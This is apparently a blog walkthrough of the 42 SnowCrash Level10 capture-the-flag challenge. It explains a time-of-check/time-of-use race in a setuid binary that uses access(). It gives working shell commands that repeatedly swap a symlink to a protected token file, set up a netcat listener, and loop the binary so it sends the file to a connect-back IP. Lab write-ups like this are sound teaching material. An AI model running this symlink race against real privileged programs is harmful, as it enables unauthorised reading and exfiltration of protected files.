---
title: 42 SnowCrash Level10 - Walkthrough 🤖
tags:
  - ctf
  - snowcrash
  - data-race
  - access-bug
  - race-condition
categories:
  - ctfs
  - 42project
date: 2024-05-18 16:15:51
---

![snowcrash](/images/snowcrash.png)

### Introduction
In Level 10, we are presented with two files: `level10` and `token`. However, `token` is protected, and we don't have the permissions to read it. By analyzing the code in `level10`, we discover a race condition vulnerability that allows us to exploit the system and gain access to `token`.

#### What's a Race Condition?
A race condition can arise in software when a computer program has multiple code paths that are executing at the same time. If the multiple code paths take a different amount of time than expected, they can finish in a different order than expected, which can cause software bugs due to unanticipated behavior.

### The Exploit

#### Loop Link files
```sh
rm -rf /tmp/exploit && rm -rf /tmp/toto && touch /tmp/toto && chmod 777 /tmp/toto && while [ 1 ]; do ln -fs /tmp/toto /tmp/exploit && ln -fs /home/user/level10/token /tmp/exploit; done
```

This shell command sets up a race condition by continuously creating a symbolic link /tmp/exploit to /tmp/toto and then quickly changing it to point to /home/user/level10/token.

Bind on Port `6969` using Netcat

Press Ctrl+C when you get the flag

### Sent TCP Connection

```sh
while [ 1 ]; do nc -lvp 6969; done
```

This command sets up a netcat listener on port 6969 to catch the flag when it's retrieved.

### GetFlag
```sh
while [ 1 ]; do ./level10 /tmp/exploit <connect back ip>; done
```

This command continuously executes ./level10 with the exploit file /tmp/exploit, sending a connection back to <connect back ip> where <connect back ip> is the IP address where the flag will be sent.

### Conclusion

The race condition vulnerability in level10 highlights the danger of relying on the access function for security checks. The small time lapse between checking access permissions and performing file operations creates a window of opportunity for exploitation. Therefore, it's important to use more secure alternatives for access control to avoid such vulnerabilities.
